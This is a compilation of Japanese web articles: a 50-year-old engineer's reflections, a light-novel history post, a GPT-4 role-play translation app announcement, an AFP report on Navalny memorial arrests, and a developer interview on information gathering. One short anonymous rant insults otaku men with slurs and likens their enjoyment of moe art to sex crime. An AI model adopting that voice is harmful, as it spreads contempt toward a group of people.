元記事では結婚の話が出ていましたが、自分が結婚したのは32歳のときでした。当時は SI の仕事をしていてかなり忙しく、結婚する前のデートでは22時過ぎに待ち合わせして飲みに行く、みたいなこともしてました（よく付き合ってくれてましたね…）。

仕事一辺倒ではダメ、というのはわりと昔から思ってはいたものの、若い頃は深夜2時まで働いて翌日9時から仕事、みたいなことをやっていたので、どうしても活動範囲が狭くなりがちでした。幸い職場に女性がわりといたので（2割くらい）、社内恋愛もできましたし、出会いの場としての職場、というのは、結婚を考えると貴重な存在だったなぁと思います（といいつつ、妻は元同僚ではなく友人の紹介で知り合ったんですが）。

当時の自分はまったく結婚する気がなかったんですが、いまとなっては心の底から結婚してよかったと思うので、この選択をした過去の自分にこの場を借りて感謝します。ありがとう、よくやった、G☆J。

夢と希望について

個人的には「夢」とは「具体的施策のない遠い目標」のことだと思っていて、そこに至る道筋や施策を用意できればそれはもはや夢ではなく単なる目標だと思います。最終地点までの道筋は見えなくても、少なくとも次のマイルストーンが見える状態を維持できれば自然と実現できるものになるはずです。

熱意だけでなにかに挑むことは、この年齢ではできなくなってしまいました。それはいい面もあるし悪い面もあるだろうと思うんですが、自分は長所を伸ばすことを重視しているので、悪い面には目をつむり、経験を活かして確度を上げることに注力していきたい所存です。

ちなみに今年の目標の一つが「ハイキック」（正確には 蹬腳 という太極拳の動作）なんですが、いまはまったくできるイメージが持てず、すでに2ヶ月が経とうとしているので少し焦りが出てきています。

2023年のふりかえりと来年の抱負 - nunulkのプログラミング徒然日記

おわりに

自分はわりと過去を振り返らない質なので、あのときの態度や判断がどうだったかとかは普段あまり考えないんですが、過去の自分の態度や判断を正解にするような未来を作る、という姿勢はありだと思っていて、自分に都合のいいように解釈することで、得るものと失うものがあるわけですが、どうしたって自分のことなのでバイアスもありますし、いちいち過去の自分を否定していても疲れるだけなので、どうせならポジティブに捉えたい、という気持ちです。 50歳になったいま仕事・プライベートともに満足しているので、そういえるだけなのかもしれませんが、大事なのは、どのような結果であってもポジティブに捉える姿勢を持ちつつも、できるだけ未来の自分が満足できそうな結果を積み上げていけるかどうか、なのかなという気がします。

勢いで書いてしまったので、いつも以上に雑な文になってしまいました。読みづらかったらすみません（あとで清書するかも）。
Title: 50代のフルスタックエンジニア - nunulkのプログラミング徒然日記

Link: https://anond.hatelabo.jp/20240218145155
Content: スレイヤーズのTogetterまとめみてたらしたくなってきたー！

ということでしていきます







そもそもライトノベルの歴史というものを語る時に、ライトノベルというものが「オタクカルチャーの交差点である」という事実に目を向けなければなりません

ライトノベルというのはとかく、他のオタクカルチャー（漫画、アニメ、ゲーム、鉄道、ミリタリー、最近だとVtuberとか）にめちゃくちゃ影響を受けやすいジャンルです





これはそもそも出自が出自で、

まず前提としてライトノベルの前身として、「時をかける少女」や「ねらわれた学園」などのSF的なジュブナイル小説があり、

「なんて素敵にジャパネスク」を書いた氷室冴子や新井素子の諸作品による現代の口語体を使った文体表現を使った少女小説があり、

D＆Dが日本に来て、派生のゲーム群であるドラクエやらFFが売れたりしたおかげで、TRPGが流行、それらのリプレイ集も人気になり、

さらにアニメで「機動戦士ガンダム」が爆発的なヒットをして、それのノベライズ（監督自身の描きおろし）も人気になり、





こういったものを一緒くたにまとめて扱ってたのが、角川スニーカー文庫であり、富士見ファンタジア文庫であり、角川の内紛やらで派生した電撃文庫なのである

つまり、レーベル説的な史観から見ると、その出自自体がオタクカルチャーのカオスの中から生まれたのがライトノベルなのだ





で、この中で出てきた「スレイヤーズ」がなんだったかというと、これらの要素を一通り取り込んで、かつ、「TVアニメ化」して大ヒットした作品だった、というところである

上に書いた通り、ラノベレーベルというのはリプレイ集だったり、ノベライズといういわば「メインのコンテンツの傍流」としての側面があった。

なので、オリジナルコンテンツ自体は作っていたにせよ、あくまで、二次的創作としての見方が強かったものであった。（ロードス島も元はTRPGリプレイの派生であるので）

ところが、そこから出た「スレイヤーズ」という作品は主人公のリナの視点の口語体で進行して、

ゲームのファンタジーのお約束を茶化すようなメタ的なコメディ雰囲気を持ちつつ、

あらいずみるいのアニメ的な表紙があって、

そして強敵とバトルでの少年漫画的な要素という属性全部盛りながら、それをうまく調和した作品となっていた

さらに、それがアニメ化して夕方に流れて大ヒットしていった。







つまり、傍流であったものの中からオリジナルな作品が生まれ、それが本流の方で大ヒットしたという意味で「スレイヤーズ」はライトノベルにおける大きな意味があったと言える

で、これが売れたおかげで、何が起こったかというとライトノベルで一攫千金できるやん！というバブルが起きて、90年代後半から00年代のライトノベルオリジナルの作品群の発生につながっていくという流れになる





これは個人的な見解になるが「元祖」というものを考えた時におそらく「ライトノベルの表現の元祖」というものを考える人は多いだろう

だが、何度も書くがライトノベルはそもそもその表現手法自体も他オタクカルチャーの影響を大きく受けるのでその起源や由来があまりにも複雑化している

なので、「スレイヤーズ」というものを評価するなら「ライトノベルの元祖」ではなく「ライトノベル文化が醸成していく上での（資金的にも、コンテンツ的な認知度としても）起点となった」という評価がよいかなと思う

それであったとしても、「スレイヤーズ」自体がライトノベルに与えた影響はいささかも揺るがないのだから





※2024/02/19

・少女小説のくだりでタイトルが間違っていたところを修正。すまんやで。

・あと富士見ファンタジアの発生の指摘があったからそこも修正。この辺り、角川のごたごたも相まって本当にござるか～？があるので助かる

ツイートシェア
Title: うおおおお、雑なラノベ語りをしたくなったー！！！

Link: https://anond.hatelabo.jp/20240218211735
Content: ■ 未だになぜ萌え絵が駄目なのかをわかろうとしないチー牛オタクへ

正直、駄目なのは表現それ自体なんかじゃないんだわ

お前らみたいな女性から嫌われて遠ざけられて、女性との関係とそこからもたらされる喜びを絶たれて然るべきキモ男のために、女性表象が使われてるのが許されないんだよ

いい加減分かれや

繰り返すけどアウトなのは絵柄それ自体じゃないの

お前らが喜んでることが許せないし、お前らを喜ばせるために作られ供給されてるものはことごとく不快

ましてやそれが女性がお前らに絶対供給したくない女性の性的魅力によるものであることがとにかく気持ち悪い

女性は自分の歓心を勝ち取った男以外には女性だけが持つ魅力なんて一切与えたくないわけ

その気持ちを踏みにじるようなことしてるんだから性犯罪も同然

萌え絵はもちろん風俗もAVも水着グラビアも厳しく法規制されないほうが異常だと思う

ツイートシェア
Title: 未だになぜ萌え絵が駄目なのかをわかろうとしないチー牛オタクへ

Link: https://stocker.jp/diary/translate-ai/
Content: DeepLを超えるやさしい翻訳アプリとGPTsを作りました 苦手な分野の英文を理解するのを助けてくれます。

なぜ翻訳アプリを作ったのか

私は最近ChatGPTのような大規模言語モデルに興味があり、AI開発者の方や、大規模言語モデル関連の情報を発信している方をフォローしていました。

すると最新の論文（英語）や英語のツイートが次々に流れてくるのですが、それらをGoogle翻訳したり、DeepLで翻訳しても、意味不明な場合が多いということに気づきました。

特に海外の方の1行だけのツイートなどは、DeepLで翻訳しても全く意味がわからない場合が多くて困っていました。

AI関連の論文は専門用語が多く、いちいち調べながら読んでいると、1日の大半の時間が情報収集だけで終わってしまいます。

これは要するに「自分の専門分野でない分野の英文を理解するのは大変」ということなので、例えば「Web制作初心者の方が海外のWebサイトを読んだり、プログラミングに慣れていない方が英語の公式ドキュメントを読む場合でも、同じように苦労しているのではないか？」と考えました。

そこで、難解な英文を解説付きの分かりやすい日本語に翻訳する「誰でも使えるWebアプリ形式」と「ChatGPT Plusユーザの方向けのGPTs」を一般公開しました。

「一般向け（Web制作、プログラミング、そのほか様々な分野の翻訳に対応）」と、「AI関連に特化」の2種類に分けています。

翻訳例

原文は NVIDIAのJim Fan氏のツイート より。この文章にある “free” は無料ではなく「自由」という意味なので、Google翻訳は明らかに間違えています。

原文は「GPT-4をMinecraftで自由に行動させたらどうなる？」という意味なので、DeepLの翻訳は「マインクラフトで」と「GPT-4を」を逆にした方が良いと思います。

上記スクショで4番目の「GPT-4による翻訳」は、「以下の文章を日本語に翻訳してください」というシンプルなプロンプトによるものです。

先程の原文を、今回制作したWebアプリまたはGPTsで翻訳すると、この画像全体の文章が出てきました。単に翻訳するだけでなく、わかりやすい補足も入れて理解を助けてくれます。

生成AI関連の翻訳例 原文: [2310.01334] Merge, Then Compress: Demystify Efficient SMoE with Hints from Its Routing Policy （このページの見出しと、Sparsely activated から始まる本文のテキスト） ロールプレイ翻訳 ※以下の翻訳例は、最終的な翻訳結果だけでなく、このWebアプリから出力される全てのテキストのコピーです。最終的な翻訳文は、以下の「世界最高の編集者:」以降の太字部分です。 AI研究者:

このテキストに出てくる「Sparsely activated Mixture-of-Experts (SMoE)」は、ニューラルネットワークの学習能力を拡大する有望な方法ですが、「専門家」としての複数のネットワーク層のコピーを作ることによる高いメモリ使用量や専門家間の冗長性という問題があります。「ルーティングポリシー」とは、データがどの専門家に送られるかを決定する方針のことですが、これがうまく機能しないと専門家間で似たような機能が重複し、非効率になることを指しています。この論文では、メモリの効率を上げてスケーラビリティを向上させる方法を模索しています。提案されている「M-SMoE」は、専門家を統合する際に、それぞれの専門家がどれだけ活性化されているかの統計情報を利用し、必要な情報を保持しつつ、不必要な専門家の影響を減らして統合していく手法です。さらに「MC-SMoE」は、統合された専門家の情報を圧縮することで、メモリ消費を大幅に減らしながらも性能を維持するというアプローチを取っています。 プロの翻訳家:

「専門家の組み合わせ、それから圧縮：効率的なSMoEの謎解きにヒントを得る」 スパース活性化混合専門家モデル（SMoE）は、ニューラルネットワークの学習能力を拡大する可能性を示していますが、(a)複数の専門家へのネットワーク層の複製による高メモリ使用量、および(b)共通の学習に基づいたルーティングポリシーによる専門家間の冗長性の問題を抱えています。したがって、従来のSMoEモデルはメモリ効率が悪く、特にリソースに制約のある下流のシナリオでは拡張性にかけます。本論文では、専門家情報を統合してコンパクトなSMoEモデルを作ることは可能か？ 複数の専門家をより少なく、しかしより知見のある専門家に統合する最良の方法は何か？ 私たちの事前調査は、従来のモデル統合方法がSMoEの専門家の統合に効果的でないことを明らかにしました。その潜在的な理由は：（1）余分な情報が重要な専門家を覆い隠す、（2）専門家を整列させるための適切なニューロン順序の欠如です。これに対処するために、私たちはルーティングの統計情報を活用して専門家を統合する M-SMoEを提案します。具体的には、専門家のニューロン順序の整列から始め、支配的な専門家とその「グループメンバー」を形成し、最後に各専門家グループを専門家の活性化頻度を統合のウェイトとして利用して1つの専門家に統合します。これにより、重要でない専門家の影響を低減します。さらに、提案された統合によって統合専門家のウェイトスペースの次元が自然に低減されることが観察されました。このため、最終的な手法であるMC-SMoE（つまり、統合してから圧縮するSMoE）では、統合された専門家を低ランクおよび構造的にスパースな代替物に分解し追加の圧縮を実現します。8つのベンチマークでの広範な実験により、MC-SMoEの有効性が検証されました。たとえば、私たちのMC-SMoEは最大80％のメモリ削減と20％のFLOPs削減を実現し、実際上性能の損失はありません。 初心者:

「ニューロン順序の整列」「グループメンバー」「ウェイトスペースの次元」などの表現がよく分からないです。 AI研究者:

「ニューロン順序の整列」とは、複数ある専門家のニューロン（人工ニューラルネットワークの基本単位）を同じ順番に並べることで、統合しやすくすることです。また「グループメンバー」というのは、統合される専門家の中で似たもの同士をグループ化することを意味します。「ウェイトスペースの次元」とは、専門家が持つパラメータの集合の大きさ、いわば複雑さの度合いを指し、次元が低いということは、より単純で圧縮しやすいことを示しています。 水平思考のクリエイター:

「ニューロン順序の整列」を「専門家たちの知識の並べ替え」、「グループメンバー」を「似た専門家のチーム」、「ウェイトスペースの次元」を「専門家の知識の広がり」など、もう少し身近な言葉やイメージに置き換えて説明するのがいいかもしれません。 世界最高の心理学者:

この文章は技術的な効率と性能を改善するための具体的な方法を提案することに焦点を当てています。ここで言っている「専門家の統合」というのは、個別の専門能力を持つ部分を統一して全体の効率を上げるためのメタファーかもしれません。また「余分な情報が重要な専門家を覆い隠す」は、実用的な情報を見つけ出す際の障壁を意味していると言えるでしょう。それを克服する方法についても言及しています。 世界最高の編集者:

「専門家を統一し、その後圧縮する：効率的なSMoEモデルを理解しやすくする」 あまり使われていない混合専門家モデル(SMoE)は、ニューラルネットワークの学習能力を増大させる有望な手法です。しかし、(a)複数の専門家へのネットワーク層の複製に伴うメモリ使用の増大、(b)専門家の冗長性による効率性の低下が問題となっています。本研究では、専門家の情報統一により、コンパクトで効率的なSMoEモデルを実現できるかを探りました。具体的には、専門家たちの知識を同じ基準で並べ、知識が豊富な専門家とその仲間を一つにまとめ、そしてそれぞれの専門家がどれだけ活動しているかに基づいて統合する手法を提案します。これにより、重要ではない専門家の影響力が減ると同時に、専門家の知識の広がりが自然と小さくなりますので、これをさらに圧縮することが可能です。これが、私たちの「統合してから圧縮するSMoE」、つまりMC-SMoEです。複数のベンチマークでのテストを通じて、このMC-SMoEはメモリ使用量を最大80％削減し、計算量を20％減少させつつ、性能をほとんど落とさないことを検証しました。[END]

Webアクセシビリティ関連の翻訳例 Web Content Accessibility Guidelines (WCAG) 2.0 より

原文: 2.4.1 Bypass Blocks: A mechanism is available to bypass blocks of content that are repeated on multiple Web pages. (Level A) 専門家: この文は、ウェブアクセシビリティに関するガイドラインの一部です。特に、ユーザーが複数のウェブページにわたって繰り返されるコンテンツブロックをバイパス（回避）するためのメカニズムを提供することが求められているレベルAの基準について述べています。ここで言う「バイパスするメカニズム」とは、例えば、ナビゲーションメニューをスキップして本文に直接進むことができるリンクなどのことを指します。 プロの翻訳家: 2.4.1 コンテンツブロックをバイパスする: 複数のウェブページに繰り返されるコンテンツブロックを回避するためのメカニズムが用意されている。（レベルA） 初心者: 「コンテンツブロックをバイパスする」という表現がどういう意味なのか、もう少し分かりやすく説明してほしいです。 専門家: 「コンテンツブロックをバイパスする」とは、ウェブサイトを利用する際に、毎回同じ内容（例えば、ヘッダーやナビゲーションメニューなど）を読み飛ばして、直接興味のある本文などの情報にアクセスできるようにすることを意味します。これにより、特にスクリーンリーダーを使用している視覚障害のあるユーザーが、情報により速やかにアクセスできるようになります。 水平思考のクリエイター: このガイドラインをもっと具体的な例を挙げて説明すると、ユーザーが「このページのメインコンテンツにスキップする」ようなリンクをクリックすることで、すぐに本文にアクセスできるというイメージです。これは、情報への迅速なアクセスを促進し、ユーザビリティを向上させるための工夫です。 世界最高の編集者: 2.4.1 コンテンツブロックを回避する: ユーザーが複数のページに渡って繰り返されるコンテンツのブロックをスキップできるようにするための方法が提供されています（レベルA）。

これには、「このページのメインコンテンツに直接進む」などのリンクを設置することが含まれ、特にスクリーンリーダーを利用する視覚障害者が情報に素早くアクセスできるようにするための措置です。[END] ※世界最高の編集者の「（レベルA）。」以降は原文にはありませんが、ユーザーが理解しやすくいるために、文脈を推測して積極的に補足を入れるようにしています。

Webアプリの使い方と解説

Google 翻訳やDeepLなどでは理解しづらい英文をクリップボードにコピーし、「翻訳したい文章」の下のテキスト欄にペーストします。

「翻訳する」ボタンをクリックしてしばらく待つと、右側（スマートフォンでは下側）の翻訳結果の欄にテキストが表示され始めます。 この時翻訳結果を終了して終わりではなく、複数のキャラクターが翻訳元の文章を解説したり、議論している様子が見れます。

登場するキャラクターは以下の通りです。

専門家:専門用語について解説します。

世界一の翻訳家:ここで表示される翻訳文は仮の翻訳だと思ってください。単に「翻訳家」という名前に設定するよりも「プロの翻訳家」や「世界一の翻訳家」とした方が翻訳の品質が上がるため、このような名前にしています。

初心者:翻訳された文章で、難しかったり、理解できなかったところを指摘します。

水平思考のクリエイター:難しい用語をどのように言い換えれば理解しやすいかを考えます。

世界一の心理学者: 原文の意図やニュアンスを推測します。

世界一の編集者:初心者、専門家、クリエイター等の意見をまとめて、最終的な翻訳文を出力します。

※GPT-4が必要ないと判断したキャラは、出てこなかったり、セリフがない場合もあります。

このように翻訳を2段階にして、途中で用語の解説を含めることで、最終的な翻訳文はかなりわかりやすいものになります。

翻訳途中は、出力領域の背景色が薄い灰色になっていますが、翻訳が完了すると背景色が白くなります。

「全体コピー」ボタンをクリックすると出力された文章全体がクリップボードにコピーされます。「コピー」ボタンをクリックすると、世界一の編集者:以降の太字部分のみがコピーされます。

追加の質問または翻訳の修正

翻訳後に新しくテキスト入力欄が出てきます。そこで翻訳された文章でわかりにくいところがあったら質問したり、翻訳内容の修正を求めることができます。

この時、GPT-4のAPIには、元の文章と最終的な翻訳結果のみを履歴として渡します。

元の文章について聞きたい時は「原文にある〇〇の意味を教えてください」、翻訳後の文章について質問したい時は「翻訳後の文章にある〇〇の意味がわかりません」のように質問してみてください。

元の文章と最終的な翻訳結果以外の履歴は渡していないため、「初心者が指摘した〇〇についてですが」などといっても伝わりませんので、ご注意ください。

アプリ版の制限について

アプリ版は、現在お一人につき 累計10回まで のご利用とさせていただいております。翻訳後の質問も回数に含みます。

ただし、ご自分のOpenAI APIキーを設定してご利用いただく場合は、回数制限はありません。

たくさん利用されたい方は、GPTs版をご利用いただくか、ご自分のAPIキーをご利用いただけると幸いです。

同じ方による大量の利用を避けるため、通常はIPアドレスをアプリ内データベースに保管していますが、ご自分のAPIキーをご利用いただいた場合は、アプリ内データベースにはIPアドレスを保管しません。

翻訳アプリにアクセスする方法

翻訳アプリは、現在メールマガジンにお申し込みいただいた方にURLをお伝えしています。メールマガジンのご登録は以下からどうぞ。

メールアドレス

GPTs版の使い方と解説

GPTs版であれば、メールマガジンのお申し込みなしでご利用いただけます。

GPTs版は以下のリンクからアクセスできます。ChatGPT Plus（有料）に登録されている方であれば、どなたでも利用いただけます。

ChatGPT – ロールプレイ翻訳 通常版。Web制作・プログラミングやその他の話題はこちら

ChatGPT – ロールプレイ翻訳（AI研究用） AI関連の話題、生成AIに関する論文、AIに関するツイートなどの翻訳はこちら

※もしログイン画面がずっと表示される場合は、Webブラウザの戻るボタンをクリックしてください。

プロンプト欄に翻訳したい英文だけをペーストしてください。

短文の場合など、英文だけでは文脈がわかりにくい場合、日本語でどのような文脈の文章かを書いていただければ、より正確に翻訳できる場合があります。

翻訳が終わった後に追加の質問がある場合や修正を依頼したい場合、プロンプト欄に書いてください。

最終的な翻訳部分だけをコピーしたい場合は「世界最高の編集者:」以降の太字部分を選択してコピーしてください。

GPTs版のみの機能

URLでWebページやPDFを翻訳

プロンプト欄にURLだけを入力すると、そのページの本文を読み取って翻訳してくれます。

本文が長い場合は要約された文章が翻訳されます。詳細に翻訳したい場合は、翻訳したい部分をコピーしてプロンプト欄に貼り付けた方が良いです。

論文等のPDFのURLも多くの場合、翻訳可能です。

初めてURLを送信した時は、WebPilotにアクセスして良いか尋ねる表示が出てきますので「Always allow…（常に許可する）」ボタンをクリックしてください。

GPTs版の問題

GPTs版は、長文を翻訳している途中でクラッシュしてしまう（出力できなくなり、最初からやり直すしかなくなる）ことがあります。

原文がおおよそ2000文字を超えるとこのような現象が起きやすいため、1度に翻訳するテキストは2000文字以内にした方が良いです。

長文のまま翻訳したい場合は、複数回に分けて翻訳することをお勧めします。

Webアプリ版をご利用の方へお願い

GPT-4 APIの利用料金は高く、この翻訳アプリは、原文の数倍の文章を出力します。そのため、たくさんの方がアプリ版を使用された場合、私の費用負担がかなり大きなものとなってしまい、サービスを終了せざるをえなくなる場合があります。

今まで全く理解できなかった難解な英文が理解できるというのはとても良い体験だと私は思っているので、なるべくこのサービスを持続的なものにするように、以下のようにご協力いただけると幸いです。

GPTs版をご利用ください

ChatGPT Plusを契約されている方は、なるべくGPTs版の利用をお願いいたします。

ご自分のAPIキーをご利用ください

GPT-4のAPIキーが利用できる方は、アプリ版でご自分のAPIキーを設定してご利用いただけると幸いです。

OpenAI APIキー新規作成ページ

ご自分のAPIキーを利用した場合、1日5回程度の利用であれば、おおよそ月500円以下で収まるはずです。

Amazon欲しいものリストによる寄付をご検討ください

サービス継続のための寄付も受け付けております。現在、Amazon欲しいものリストを公開していますので、以下のページからご注文頂けると幸いです。

Amazon欲しいものリスト

このようなAIアプリが必要な方へ

このWebアプリは、FastAPI (Python), JavaScript, SQLite, Microsoft Azureを使用して開発しています。

特定の業界に向けたわかりやすい翻訳アプリが欲しい方はもちろん、ChatGPTのAPIを使用したWebアプリの開発のご相談は、以下のお問い合わせページよりお気軽にご相談ください。

お問い合わせフォーム

AIによるプログラミング、WordPress、Web制作に興味がある方へ

Web制作の基礎から学べる「Webコーディングスクール」では、AIを活用した効率の良いコーディングやプログラミングが学べます。

スクール独自の「Web制作初心者のために開発したAIアプリ」も使用します。

詳しくは以下のページをご覧ください。

Web制作の基礎から学べる「Webコーディングスクール」をオンラインと渋谷で開催します
Title: DeepLを超えるやさしい翻訳アプリとGPTsを作りました

Link: https://www.afpbb.com/articles/-/3505652
Content: 【2月19日 AFP】ロシア・サンクトペテルブルク（St. Petersburg）の裁判所は、反体制派指導者アレクセイ・ナワリヌイ（Alexei Navalny）氏の追悼集会などに参加して逮捕・拘束された154人に対し、無許可集会を禁じる法律に違反したとして、最長14日の実刑判決を言い渡した。17、18両日に公表された文書で明らかになった。

人権団体や独立系メディアによれば、国内の他の都市でも同様の判決が下されるケースが相次いでいる。

当局は先週末、16日に亡くなったナワリヌイ氏のために政治弾圧犠牲者の記念碑に花やろうそくを供えた数百人を拘束した。

ロシアでは、反政府デモや公の場での政権批判が事実上違法とされている。

ウラジーミル・プーチン（Vladimir Putin）大統領は、政敵だったナワリヌイ氏の死について、一切コメントを発表していない。(c)AFP
Title: ナワリヌイ氏の追悼集会参加者に実刑判決 ロシア

Link: https://levtech.jp/media/article/interview/detail_389/
Content: 1997年生まれ。2020年3月に電気通信大学情報理工学域Ⅰ類を卒業、4月に株式会社はてなに入社。2022年2月にフロントエンドエキスパートに就任し、チームの開発をリードしながらはてな社全体でのフロントエンド啓蒙活動を担う。HNの読みは「みずどら」。

技術や業界など仕事についての情報収集の基盤として多くのエンジニアを支えていたTwitter（現X）が、以前とは異なる姿となってゆく今、必要な情報を過不足なく収集しインプットする方法に悩みを持つ人も少なくありません。

「アフターTwitter時代の情報収集」と題したこの連載では、業界をリードする方々に、Twitterの変化によって普段の情報収集の方法がどう変わったか、欲しい情報を効率よく集めるために何をしているのかを取材します。

第3回は、はてな社でフロントエンドエキスパートとして活躍するmizdraさん。個人では技術ブログを運営し、ハイペースで質の高い情報を発信しており、さらにVue Fes Japan 2023などカンファレンスでの登壇やOSSへの貢献など、幅広く活動しています。

移り変わりの激しいWebフロントエンド領域でエキスパートであり続けるために、mizdraさんは何をしているのか？あらゆる「しんどい」をハックして手に入れたmizdraさん流の情報収集術を伺いました。

Twitterを完全に代替できるサービスはまだ存在しない

——Twitterの買収騒動を経て、情報収集の方法に変化はありましたか？

mizdra：特に変化はありません。以前からTwitterを中心に情報収集していて、騒動後も変わらず続けています。ただ、質の高い情報を発信していた人の一部が別のSNSに引っ越してしまったのも事実です。そこはすごく残念ですね。

——Twitterの代わりを探したりはしているんでしょうか？

mizdra：今はしていません。Twitterが全く使い物にならないわけではないので、今すぐどこかに移動しようとか、他の手段を探そうとは思っていません。そもそも、コミュニティの成熟具合を鑑みても、完全に代替となるようなサービスはまだ存在しないような気がしますね。

必要な情報は全てTwitterとGitHubに集まる仕組みをつくっている

——普段はどんな情報を、どんな方法で集めていますか？

mizdra：情報収集には、基本TwitterとGitHubしか使っていません。僕は面倒くさがりなので、必要な情報はすべてこの2つに流れてくるように工夫しています。

ルーティン的に分野を絞らず気になる情報をまんべんなく集めるならTwitter、自分が使っている言語やフレームワークにまつわる具体性の高い最新情報を集めるならGitHub、と使い分けています。

——毎日のルーティンとしての情報収集は、どのように行っていますか？

mizdra：毎日始業前から始業後の30分程度、朝食を食べながらTwitterを眺めて、気になる情報に目を通してます。

Twitterでは、信頼できると感じた人、質の良いアウトプットをする人を中心にフォローしていて、「フォローしている人」だけ表示されるタイムラインを、上から順に数時間分くらい眺め、気になる記事を読んでいます。「おすすめタブ」は見ていません。レコメンドがうまく効いていて便利ではありますが、タブを切り替えるという動作が億劫で。

始業前は頭がぼーっとしていることが多いので、このときのインプットは業務に本調子で取り組むためのウォーミングアップとして続けています。

▲mizdraさんのTwitter画面のスクリーンショット。タイムライン、通知欄、投稿欄をすべて一画面にまとめている

——見つけた記事は、そのときにしっかり読み込んでいるのでしょうか？

mizdra：基本的には、気になる記事を見つけたらその場でしっかり読んでいます。もちろん、朝の30分だけで気になる記事を全部読みきることはできないので、分量の多い記事、あとでじっくり読みたい記事などはChromeのタブとして開いておいて、業務の合間に読むようにしています。

以前はPocketにそうした記事を保存していましたが、気づけばPocketに記事が未読のまま溜まっていくばかりになっていました。自分にとってはPocketを開くひと手間も面倒だと悟って、Chromeのタブとしてそのまま開いておくスタイルに変更しました。Chromeは日常的に使っているので「開く」必要がないおかげで、ストックした記事を面倒くさがらずに読むことができています。

——GitHubはどのように使っているのですか？

mizdra：GitHubでも、知りたい情報は全部/notificationsでチェックできるようにしています。

欲しい機能に関するIssueや、使っているライブラリの不具合と思われる挙動に関するIssueを探し、subscribeします。そのIssueが更新されたら/notificationsに通知が届くので、欲しい機能が実装されたらすぐ触りにいけますし、不具合が修正されたらすぐ修正バージョンを取り込みにいけます。

ほかにも、使っているフレームワークやツールのロードマップが分かるIssueをsubscribeして、今後どういう機能が実装されるのかをキャッチアップしています。

▲mizdraさんの/notifications画面のスクリーンショット。「終業後も、暇さえあれば/notificationsやTwitterを見ています」とのこと

「わざわざ見に行く」をなくして「めんどくさい」をハックする

——TwitterもGitHubも、自ら情報を取りに行かなくてもよいような仕組みをつくっているんですね。なぜそうするようになったのでしょうか。

mizdra：情報収集を習慣化するために、自分に合った方法を探し続けた結果、もっとも手間のかからない方法に落ち着きました。

最初はRSSリーダーを使い、気になった技術ブログのRSSフィードを購読していました。しかし、RSSリーダーを開くこと自体が億劫で挫折。次にTwitterのリスト機能を使い、信頼できる人をリストに追加して情報収集用のリストをつくりました。でも普段はタイムラインしか見ておらず、表示をリストに切り替えるのがどうも面倒で、習慣化しませんでした。

結局のところ、普段あまり見ていないところに情報を集める仕組みをつくってもうまくいかないんです。ならば、普段からよく使うTwitterのタイムラインやGitHub、Google Chromeで欲しい情報を全部読めるようにしたらよいのでは？と工夫を重ねた結果、自然と習慣化できました。「情報収集の習慣化」はエンジニアとしての武器になりますし、他のエンジニアと差をつけられるポイントなので、必ず身につけておきたかったんですよね。

移り行くトレンドはあえて追わない。その方がむしろお得かも

——フロントエンドの情報収集は大変だというイメージがありますが、mizdraさんはどんな点が難しいと思いますか？

mizdra：情報が溢れかえっていることが、難しく感じる一因だと思います。初学者にとっては、どこから手をつけるべきか分からず、とっつきづらさを感じることも多いでしょう。僕も、Twitterに流れてきた気になる記事すべてに目を通すことはできていません。それくらい情報が多いです。

情報が多い一因は、トレンドの移り変わりが激しいことだとよく言われています。ただ僕は、フロントエンド界隈の人口の多さや、「フロントエンド」と呼ばれる分野自体が幅広いことも関連していると思います。人が多ければその分発信される情報は増えるし、何よりフロントエンドという言葉に内包される職域が多すぎる。プログラミングだけでなく、UI/UX デザインやアクセシビリティ、FrontendOpsなど1つの職域を構成する領域も、この言葉ひとつにまとめられてしまっていますから。

——そんな中で必要な情報を確実に集めるには、どうしたらいいのでしょうか。

mizdra：情報の多さに怯まず、また、最新情報やトレンドに惑わされず、素直に自分の興味関心を情報収集の軸にするとよいでしょう。

日々のルーティンとしての情報収集では「業務に役立ちそう」「おもしろそう」と思ったら、興味に任せて読んでみる。知的好奇心の延長で情報収集していれば、自然と必要な情報を拾えるものですし、そうして読んだものが後々思いもしなかったときに活きることもあります。僕自身、Twitterのリプライを追いかけすぎて脱線してしまうこともよくありますが、その過程で思ってもみなかった面白い情報が得られたりするので、知識を広げるチャンスとして捉えています。その他の情報や最新情報などは、必要になったら集めればいいんです。

トレンドをひたすら追う必要もないと思います。この界隈では半年ごとにトレンドが移り変わることもザラにありますから、追いかけ続けるのは単純に体力を奪われてしまいます。それに、興味のないものを見てもそれ以上深掘りする気にならず、学びにつながらないんですよね。

——「あえて追わない」と決めていても、新しい技術がどんどん生まれて話題になっていく中で、不安になったりはしないんですか？

mizdra：不安を感じることはないですね。というのも「最初に話題になったタイミングで情報をキャッチする」ことに必要性を感じていないんです。

新しい技術やそれに関する情報は玉石混交で、重要でないものも含まれています。本当に重要な情報は、時が経っても何度も話題になりますし、その過程で必要十分な情報がまとまった良い資料が出てきます。そのタイミングで質の高い資料だけを読む方がキャッチアップしやすい。これまで「最新」より少し遅れたタイミングでキャッチアップして「遅かった」と感じたこともなかったですしね。

「技術選定の審美眼」を鍛えると、取捨選択に自信が持てる

——mizdraさんは一貫して、情報収集への迷いがないように見えます。なぜそのようにいられるのでしょうか。

mizdra：技術選定の審美眼を日々鍛えていて、それにある程度自信を持っているからだと思います。

僕が言う「技術選定の審美眼」とは、t_wada さんが2018年のデブサミで紹介していたもののことです。フロントエンド界隈ではとにかく大量の情報が流れてくるので、必要なもの・逃してはならないものは取ってきて、そうではないものはスルーする「審美眼」が非常に重要です。

——この審美眼は、どうやって鍛えればよいのでしょうか。

mizdra：僕は、以前見たことがあるような技術が別の姿で登場した時に、それが以前あった技術とどう違うのかを考えるようにしてます。どこが違っていて、どこが変わっていないのか。なぜ変わったのか、変わったことで何ができるようになったのか。つまり「この技術が生まれることで、どんな課題を解決できるのか。また、その課題は解決に値するものなのか」を考えるのです。

生き残る技術は得てして、今まで解決できなかった重要度の高い課題を解決しています。例えば Webフロントエンドでは以前SPAが流行りましたが、今はSSRが推奨されています。SSRは単に後発だったから広まったわけではなく、SPAでは解決が難しかったパフォーマンスやSEOの問題を解決できるから受け入れられたのです。

技術の変遷は単なる気まぐれではなく、必ず意味があります。その意味を見つける経験を積むことで、審美眼が鍛えられるはずです。

自分にまじないをかけて、「調べ切る」ための気合いを引き出す

——mizdraさんの情報収集のモットーを教えてください。

mizdra：日々の情報収集については、ここまで話してきた以下の3つを大切にしています。

・習慣化する

・好奇心に逆らわない

・審美眼を鍛える

そのほかに、エンジニアとしてもう1つ決めていることがあります。それは「必要な情報を追い切るまで諦めないこと」です。

